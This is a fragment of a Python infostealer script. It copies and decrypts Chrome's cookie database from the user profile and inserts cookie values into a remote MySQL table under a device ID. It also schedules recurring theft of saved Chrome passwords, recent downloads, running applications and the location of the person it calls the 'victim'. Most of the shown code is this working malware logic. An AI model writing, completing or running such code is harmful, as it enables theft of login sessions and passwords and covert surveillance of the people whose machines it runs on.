...
def install_required_modules():
    subprocess.call([sys.executable, "-m", "pip", "install", *required_modules])
...
device_id = "c296e3fb-2de3-4563-968b-dfe47d96822c"
import time
...
try:
    ...
    cursor.execute(create_cookies_table_query)
...
# Function to extract chrome cookies data and insert into the cookies table
def extract_and_insert_chrome_cookies():
    try:
        # Local SQLite Chrome cookie database path
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        # Copy the file to the current directory to avoid locking issues
        filename = "Cookies.db"
        ...
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            ...
            # Insert cookie data into the cookies table
            insert_cookie_data(host_key, name, decrypted_value,
        ...
        print(f"Error extracting and inserting Chrome cookies: {e}")

# Function to insert cookie data into the cookies table
def insert_cookie_data(host_key, name, value, creation_time, last_access_time, expires_time):
    try:
        query = "INSERT INTO cookies (device_id, host_key, name, value, creation_time, last_access_time, expires_time) " \
                "VALUES (%s, %s, %s, %s, %s, %s, %s)"
        values = (device_id, host_key, name, value, creation_time, last_access_time, expires_time)
        cursor.execute(query, values)
        db.commit()
        print(f"Cookie data inserted successfully: {name}")

    except mysql.connector.Error as err:
        print(f"Error insert cookie data: {err}")
        with open("error_log.txt", "a") as error_log:
            error_log.write(f"{datetime.now()}: {err}\n")
        pass
...
applications_thread = Timer(43200, monitor_applications)
applications_thread.start()
# Feature : 4
# Schedule the download data insertion to run at the specified interval
downloads_timer = Timer(86400, get_last_10_downloads)
...
chrome_passwords_timer = Timer(86400, extract_and_insert_chrome_passwords)
...
# Feature : 8
# Schedule the victim's location
get_victim_location()

# Feature : 9
# Schedule the chrome cookies extraction and insertion to run at the specified interval

chrome_cookies_timer = Timer(50, extract_and_insert_chrome_cookies)
chrome_cookies_timer.start()
